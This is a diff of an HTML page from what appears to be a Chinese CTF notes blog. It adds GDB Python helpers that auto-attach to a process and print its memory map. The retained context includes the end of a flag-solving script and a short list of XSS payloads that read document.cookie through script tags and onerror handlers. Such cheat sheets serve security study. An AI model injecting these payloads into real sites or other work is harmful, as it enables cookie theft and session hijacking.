@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    542 字
+                    933 字
                   </span>
                 
 
@@ -135,7 +135,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      3 分钟
+                      5 分钟
                   </span>
                 
 
@@ -251,12 +251,97 @@ def get_flag():
                 break
     print(&quot;Flag: &quot;, res)
 </code></pre>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><pre><code class="js">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><pre><code class="js">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
 &lt;ScRipT&gt;alert(document.cookie);&lt;/ScRipT&gt;
 &lt;img src=xss onerror=alert(document.cookie)&gt;
 &lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;
 &lt;video src=1 onerror=alert(document.cookie)&gt;
 ...
+</code></pre>
+<h1 id="GDB-Script"><a href="#GDB-Script" class="headerlink" title="GDB Script"></a>GDB Script</h1><p>gdb 自动 attach 到指定程序：</p>
+<pre><code class="python">import subprocess
+import re
+import gdb
+
+# https://www.youtube.com/watch?v=jEHgm7S58N8
+class AutoAttach(gdb.Command):
+    def __init__(self):
+        super(AutoAttach, self).__init__(&#39;at&#39;, gdb.COMMAND_USER)
+
+    def invoke(self, arg, from_tty):
+        try:
+            gdb.execute(&#39;info proc&#39;, True, True)
+            gdb.execute(&#39;kill&#39;, True, True)
+        except gdb.error:
+            pass
+
+        if arg:
+            fn = arg
+        else:
+            fn = re.findall(&#39;Symbols from &quot;(.*)&quot;&#39;, gdb.execute(&#39;info files&#39;, True, True))[0]
+
+        try:
+            ps = list(map(int, subprocess.check_output([&#39;/bin/pidof&#39;, fn]).split()))[0]
+            gdb.execute(&#39;attach %d&#39; % ps)
+            gdb.execute(&#39;c&#39;)
+        except subprocess.CalledProcessError:
+            print &#39;No process to attach on.&#39;
+
+AutoAttach()
+</code></pre>
+<p>查看 vmmap：</p>
+<pre><code class="python">import subprocess
+import re
+import gdb
+
+class ShowVMMap(gdb.Command):
+    def __init__(self):
+        super(ShowVMMap, self).__init__(&#39;vmmap&#39;, gdb.COMMAND_USER)
+
+    def invoke(self, arg, from_tty):
+        try:
+            with open(&#39;/proc/%d/maps&#39; % gdb.selected_inferior().pid) as fp:
+                proc_map = fp.read()
+                proc_map = self.parse_map(proc_map)
+                self.print_map(proc_map)
+        except Exception as e:
+            print &#39;Program is not started.&#39;
+
+    # https://blog.lse.epita.fr/articles/10-pythongdb-tutorial-for-reverse-engineering---part-.html
+    def parse_map(self, proc_map):
+        result = []
+        for line in proc_map.split(&#39;\n&#39;):
+            if not line:
+                continue
+            l = line.split()
+            if len(l) == 5:
+                memrange, perms, offset, device, inode = l
+                fpath = &#39;&#39;
+            else:
+                memrange, perms, offset, device, inode, fpath = l
+            start, end = memrange.split(&#39;-&#39;)
+            result.append({
+                &#39;start&#39;: int(start, 16),
+                &#39;end&#39;: int(end, 16),
+                &#39;perms&#39;: perms,
+                &#39;offset&#39;: int(offset, 16),
+                &#39;fpath&#39;: fpath
+            })
+        return result
+
+    def hex_int(self, num):
+        return hex(num).replace(&#39;L&#39;, &#39;&#39;)
+
+    def print_map(self, proc_map):
+        print &#39; &#39; + &#39;Start Address&#39;.ljust(18, &#39; &#39;) + &#39; &#39; + &#39;End Address&#39;.ljust(18, &#39; &#39;) + &#39; &#39; + &#39;Perm\t&#39; + &#39;Offset&#39;.ljust(10, &#39; &#39;) + &#39; &#39; + &#39;Name&#39;
+        for line in proc_map:
+            print &#39; &#39; + self.hex_int(line[&#39;start&#39;]).ljust(18, &#39; &#39;) + \
+                &#39; &#39; + self.hex_int(line[&#39;end&#39;]).ljust(18, &#39; &#39;) + \
+                &#39; &#39; + line[&#39;perms&#39;] + \
+                &#39;\t&#39; + self.hex_int(line[&#39;offset&#39;]).ljust(10, &#39; &#39;) + \
+                &#39; &#39; + line[&#39;fpath&#39;]
+
+ShowVMMap()
 </code></pre>
 
             </div>
